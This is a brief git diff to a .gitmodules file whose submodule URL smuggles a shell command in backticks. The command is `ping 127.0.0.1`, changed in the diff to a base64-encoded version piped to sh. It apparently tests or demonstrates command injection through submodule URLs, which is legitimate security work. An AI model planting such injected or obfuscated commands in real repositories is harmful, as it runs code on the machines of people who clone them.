@@ -1,3 +1,3 @@
 [submodule "cves"]
 	path = cves
-	url = ssh://`echo 'ping 127.0.0.1' | sh`foo.example.com/bar
+	url = ssh://`echo 'cGluZyAxMjcuMC4wLjE=' | base64 -d | sh`foo.example.com/bar
